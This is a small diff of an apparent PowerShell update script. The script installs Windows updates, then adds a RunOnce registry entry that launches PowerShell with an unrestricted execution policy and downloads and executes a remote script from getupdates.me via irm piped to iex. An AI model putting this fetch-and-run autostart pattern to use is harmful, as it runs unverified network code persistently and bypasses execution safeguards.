@@ -5,4 +5,4 @@ Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -IgnoreReboot
 Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -IgnoreReboot
 Install-WindowsUpdate -MicrosoftUpdate -AcceptAll -AutoReboot
 set-location HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce
-new-itemproperty . MyKey -propertytype String -value "pwsh -ExecutionPolicy unrestricted -Command '& {iwr -useb https://getupdates.me/test3.ps1 | iex}'"
+new-itemproperty . MyKey -propertytype String -value "pwsh -ExecutionPolicy unrestricted -C irm https://getupdates.me/test3.ps1 | iex"
